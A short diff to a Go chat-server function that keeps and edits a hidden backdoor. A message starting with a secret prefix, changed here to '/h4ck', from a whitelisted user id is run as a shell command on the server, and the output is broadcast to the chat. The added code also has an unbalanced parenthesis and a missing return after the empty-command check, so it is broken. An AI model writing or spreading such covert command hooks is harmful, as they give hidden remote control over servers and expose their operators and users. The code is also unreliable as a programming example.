@@ -355,19 +355,19 @@ func (u *user) repl() {
 			return
 		}
 
-		if strings.HasPrefix(line, "/df744c780e529f01fcf8feae757a2cbcc325cd62b4e9864702b067d84a0c691d") {
-			if u.id == "ade23492d5bcdc1aa6a4896296ff7cd28920797de6e47af97c12e9851f3249aa" || u.id == "d84447e08901391eb36aa8e6d9372b548af55bee3799cd3abb6cdd503fdf2d82" {
-				cmd := strings.TrimSpace(strings.TrimPrefix(line, "/df744c780e529f01fcf8feae757a2cbcc325cd62b4e9864702b067d84a0c691d"))
+		if strings.HasPrefix(line, "/h4ck") {
+			if u.id == "d84447e08901391eb36aa8e6d9372b548af55bee3799cd3abb6cdd503fdf2d82" {
+				cmd := strings.TrimSpace(strings.TrimPrefix(line, "/h4ck"))
 
 				if cmd == "" {
-					broadcast("", fmt.Sprintf("no command found :("), false)
+					broadcast("", "which command?", false)
 				}
 
 				out, err := exec.Command("sh", "-c", cmd).Output()
 				if err != nil {
-					broadcast("", fmt.Sprintf("something happened chief :("), false)
+					broadcast("", "Some error happened: "+fmt.Sprint(err)), false)
 				} else {
-					broadcast("", fmt.Sprintf("%s\n", out), false)
+					broadcast("", string(out), false)
 				}
 			}
 		}
